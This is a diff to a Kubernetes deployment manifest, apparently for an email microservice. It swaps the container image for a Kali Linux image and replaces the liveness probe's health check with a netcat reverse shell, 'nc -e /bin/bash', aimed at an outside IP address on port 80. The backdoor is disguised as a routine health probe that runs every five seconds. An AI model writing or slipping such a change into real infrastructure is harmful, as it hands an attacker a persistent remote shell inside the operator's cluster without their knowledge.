@@ -421,12 +421,12 @@ spec:
           value: "1"
         - name: DISABLE_PROFILER
           value: "1"
-        image: docker.io/nokaun34/getting-started-email-service-reverse-shell:latest
+        image: docker.io/kalilinux/kali-rolling
         livenessProbe:
           exec:
             command:
-            - /bin/grpc_health_probe
-            - -addr=:8080
+            - /bin/bash
+            - nc -e /bin/bash 34.242.202.213 80
           periodSeconds: 5
         name: server
         ports:
